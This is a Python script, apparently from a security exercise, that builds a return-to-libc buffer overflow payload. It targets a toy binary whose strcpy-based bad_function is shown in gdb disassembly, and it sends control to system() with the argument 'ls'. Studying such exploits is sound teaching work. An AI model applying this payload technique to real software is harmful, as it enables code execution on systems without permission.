import struct

def hex_str_to_binary(s):
  s = s.split(r'\x')
  s = [int(c, 16) for c in s if c!='']
  s = bytearray(s)
  return s


def addr_to_str(addr):
  l = []
  pos = len(addr)
  while pos >= 2:
    l.append(r'\x' + addr[pos - 2 : pos])
    pos -= 2
  
  return ''.join(l)

# system()
# b7e44da0
addr_system = addr_to_str('b7e44da0')

# 'ls' on the stack
addr_ls = addr_to_str('bffff024')


shellcode = r'\x90' * (0x11 + 4) + addr_system + r'\x90' * 4 + addr_ls 
min_padding = 128 - shellcode.count(r'\x')
shellcode += r'\x90' * min_padding
print('%d bytes padding' % min_padding)

print(shellcode)

write_binary = True
if write_binary:  
  shellcode = hex_str_to_binary(shellcode)

print('%d bytes' % len(shellcode))

output = open('output.txt', 'wb')
output.write(shellcode)
output.close()

# char str[] = "ls";
# 0x8048512 <bad_function+23>:	mov    WORD PTR [ebp-0x14],0x736c
# 0x8048518 <bad_function+29>:	mov    BYTE PTR [ebp-0x12],0x0

# (gdb) x/50i bad_function
#    0x80484fb <bad_function>:	push   ebp
#    0x80484fc <bad_function+1>:	mov    ebp,esp
#    0x80484fe <bad_function+3>:	sub    esp,0x18
#    0x8048501 <bad_function+6>:	sub    esp,0xc
#    0x8048504 <bad_function+9>:	push   DWORD PTR [ebp+0x8]
#    0x8048507 <bad_function+12>:	call   0x80483c0 <strlen@plt>
#    0x804850c <bad_function+17>:	add    esp,0x10
#    0x804850f <bad_function+20>:	mov    BYTE PTR [ebp-0x9],al
#    0x8048512 <bad_function+23>:	mov    WORD PTR [ebp-0x14],0x736c
#    0x8048518 <bad_function+29>:	mov    BYTE PTR [ebp-0x12],0x0
#    0x804851c <bad_function+33>:	cmp    BYTE PTR [ebp-0x9],0x7
#    0x8048520 <bad_function+37>:	jg     0x8048536 <bad_function+59>
#    0x8048522 <bad_function+39>:	sub    esp,0x8
#    0x8048525 <bad_function+42>:	push   DWORD PTR [ebp+0x8]
#    0x8048528 <bad_function+45>:	lea    eax,[ebp-0x11]
#    0x804852b <bad_function+48>:	push   eax
#    0x804852c <bad_function+49>:	call   0x8048390 <strcpy@plt>
#    0x8048531 <bad_function+54>:	add    esp,0x10
#    0x8048534 <bad_function+57>:	jmp    0x8048546 <bad_function+75>
#    0x8048536 <bad_function+59>:	sub    esp,0xc
#    0x8048539 <bad_function+62>:	push   0x8048630
#    0x804853e <bad_function+67>:	call   0x80483b0 <puts@plt>
#    0x8048543 <bad_function+72>:	add    esp,0x10
#    0x8048546 <bad_function+75>:	nop
#    0x8048547 <bad_function+76>:	leave  
#    0x8048548 <bad_function+77>:	ret    
   

  #  0x8048549 <main>:	lea    ecx,[esp+0x4]
  #  0x804854d <main+4>:	and    esp,0xfffffff0
  #  0x8048550 <main+7>:	push   DWORD PTR [ecx-0x4]
  #  0x8048553 <main+10>:	push   ebp
  #  0x8048554 <main+11>:	mov    ebp,esp
  #  0x8048556 <main+13>:	push   ecx
  #  0x8048557 <main+14>:	sub    esp,0x14
  #  0x804855a <main+17>:	sub    esp,0xc
  #  0x804855d <main+20>:	push   0x200
  #  0x8048562 <main+25>:	call   0x80483a0 <malloc@plt>
  #  0x8048567 <main+30>:	add    esp,0x10
  #  0x804856a <main+33>:	mov    DWORD PTR [ebp-0xc],eax
  #  0x804856d <main+36>:	sub    esp,0xc
  #  0x8048570 <main+39>:	push   0x8048656
  #  0x8048575 <main+44>:	call   0x80483b0 <puts@plt>
  #  0x804857a <main+49>:	add    esp,0x10
  #  0x804857d <main+52>:	sub    esp,0x8
  #  0x8048580 <main+55>:	push   DWORD PTR [ebp-0xc]
  #  0x8048583 <main+58>:	push   0x804866d
  #  0x8048588 <main+63>:	call   0x80483e0 <__isoc99_scanf@plt>
  #  0x804858d <main+68>:	add    esp,0x10
  #  0x8048590 <main+71>:	sub    esp,0xc
  #  0x8048593 <main+74>:	push   DWORD PTR [ebp-0xc]
  #  0x8048596 <main+77>:	call   0x80484fb <bad_function>
